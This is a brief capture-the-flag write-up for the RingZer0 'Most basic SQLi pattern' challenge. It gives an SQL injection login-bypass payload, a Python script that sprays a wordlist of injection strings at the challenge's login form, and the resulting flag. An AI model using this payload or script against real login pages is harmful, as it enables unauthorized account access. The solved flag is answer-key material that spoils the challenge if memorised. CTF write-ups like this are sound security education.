<h1>Most basic SQLi pattern</h1>
<h3>Description</h3>
<p>http://challenges.ringzer0ctf.com:10001/</p>
<h3>Solution</h3>

<p>Injection <b>admin'or'1'=1#</b></p>

```python3
import requests

wordlist = open("../Wordlist/SQL.txt",'r')
url = "http://challenges.ringzer0ctf.com:10001/"
for i in wordlist:
    i = i.strip('\n')
    data = {"username":i,"password":i}
    res = requests.post(url,data=data).text.split('GOOD JOB! ')[1].split('</div>')[0]
    if "FLAG" in res:
        print(i,"Worked!")
        print(res)
        break
```
<h3>Flag</h3>
<pre>
  FLAG-238974289383274893
</pre>
